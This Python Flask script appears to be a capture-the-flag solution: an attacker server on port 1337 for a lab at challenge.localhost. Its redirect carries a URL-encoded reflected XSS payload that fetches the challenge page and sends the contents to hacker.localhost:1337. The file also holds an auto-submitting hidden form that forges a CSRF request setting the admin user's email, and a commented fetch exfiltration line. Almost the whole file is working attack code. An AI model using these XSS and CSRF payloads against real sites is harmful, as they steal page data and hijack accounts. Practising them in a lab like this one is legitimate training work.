from flask import Flask, request, session, redirect
import os

app = Flask(__name__)
app.secret_key = b'static-key-for-dev'  # don't change each run

page = '''<body onload="document.forms[0].submit()">
    <form method="POST" action="http://challenge.localhost/publish">
        <input type="hidden" name="username" value="admin">
        <input type="hidden" name="email" value="jbelkerf@gmail.com">
        <!-- Add more fields if needed -->
    </form>
</body>'''

@app.route("/", methods=["GET"])
def challenge_get():
    #return redirect('http://challenge.localhost/ephemeral?msg="<script>fetch("http://challenge.localhost/").then(response => response.text()).then(data=>{fetch("http://hacker.localhost:1337/?" + encodeURIComponent(data));});</script>"')
    return redirect('http://challenge.localhost/ephemeral?msg="%3Cscript%3Efetch%28%22http%3A%2F%2Fchallenge.localhost%2F%22%29.then%28response%20%3D%3E%20response.text%28%29%29.then%28data%3D%3E%7Bfetch%28%22http%3A%2F%2Fhacker.localhost%3A1337%2F%3F%22%20%2B%20encodeURIComponent%28data%29%29%3B%7D%29%3B%3C%2Fscript%3E"')
    


# @app.route("/favicon.ico", methods=["GET"])
# def challengess_get():
#     return page
'''
fetch("https://challenge.localhost/").then(response => fetch("hacker.localhost:1337/" + response))
'''

# Optional: use local address
app.run("127.0.0.1", 1337)
